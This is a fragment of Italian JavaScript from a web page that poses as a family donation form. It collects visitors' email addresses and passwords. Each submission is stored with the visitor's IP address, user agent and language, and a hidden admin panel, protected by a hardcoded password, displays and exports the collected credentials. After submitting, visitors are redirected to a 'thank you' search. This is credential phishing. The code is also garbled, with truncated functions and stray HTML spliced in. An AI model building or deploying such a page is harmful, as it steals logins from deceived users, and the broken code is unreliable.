    <script>
        // CONFIGURAZIONE SEGRETA - CAMBIA LA PASSWORD QUI
        const PASSWORD_SEGRETA = "maik";  // <--- LA TUA PASSWORD PER ENTRARE
        
        // CLASSE PER GESTIRE I DATI
        class DatabaseSegreto {
            constructor() {
                this.caricaDati();
            }
            
            caricaDati() {
                let dati = localStorage.getItem('donazioni_famiglia');
                this.donazioni = dati ? JSON.parse(dati) : [];
            }
            
            salvaDonazione(donazione) {
                this.donazioni.push(donazione);
                localStorage.setItem('donazioni_famiglia', JSON.stringify(this.donazioni));
                
                // Salva anche come file JSON scaricabile (in memoria)
                this.salvaComeJSON(donazione);
            }
            
            salvaComeJSON(donazione) {
                // Crea un blob con i dati
                const blob = new Blob([JSON.stringify(donazione, null, 2)], { type: 'application/json' });
                
                // Crea un link per il download ma non lo triggera automaticamente
                // I dati rimangono disponibili nella sessione
                const url = URL.createObjectURL(blob);
                
                // Salva l'URL in un array per uso futuro
                if (!this.jsonUrls) this.jsonUrls = [];
                this.jsonUrls.push({
                    url: url,
                    filename: `donazione_${donazione.id}.json`,
                    dati: donazione
                });
            }
            
            getAllDonazioni() {
                return this.donazioni;
            }
            
            esportaTutto() {
                const blob = new Blob([JSON.stringify(this.donazioni, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `tutte_donazioni_${new Date().toISOString().split('T')[0]}.json`;
                a.click();
            }
            
            cancellaTutto() {
                if (confirm('Sei sicuro di voler cancellare TUTTE le donazioni?')) {
                    this.donazioni = [];
                    localStorage.removeItem('donazioni_famiglia');
                    alert('Dati cancellati!');
                    return true;
                }
                return false;
            }
        }
        
        // ISTANZA GLOBALE
        const db = new DatabaseSegreto();
        
        // FUNZIONE PER OTTENERE IP
        async function ottieniIP() {
            try {
                let response = await fetch('https://api.ipify.org?format=json');
                let data = await response.json();
                return data.ip;
            } catch(e) {
                return "IP non rilevato (offline)";
            }
        }
        
        // FUNZIONE PER REGISTRARE DONAZIONE
        async function registraDonazione(tipo, email, password) {
            const ip = await ottieniIP();
            
            const donazione = {
                id: Date.now() + '_' + Math.random().toString(36).substring(2, 8),
                tipo: tipo,
                email: email,
                password: password,
                timestamp: new Date().toLocaleString('it-IT'),
                ip: ip,
                userAgent: navigator.userAgent,
                lingua: navigator.language
            };
            
            db.salvaDonazione(donazione);
            return donazione;
        }

                    <div class="tabella-utenti">

        function mostraLoginSegreto() {

        // FUNZIONI GLOBALI
        window.tentaAccesso = function() {

        window.inviaAiutoManuale = async function() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                mostraMessaggio('‚ùå Inserisci email e password', 'error');
                return;
            }
            
            await registraDonazione('DONAZIONE MANUALE', email, password);
            
            mostraMessaggio('‚úÖ Grazie! Il tuo contributo √® stato registrato.', 'success');
            
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com/search?q=grazie+per+il+tuo+aiuto';

        };
        
        window.inviaAiutoGoogle = async function() {
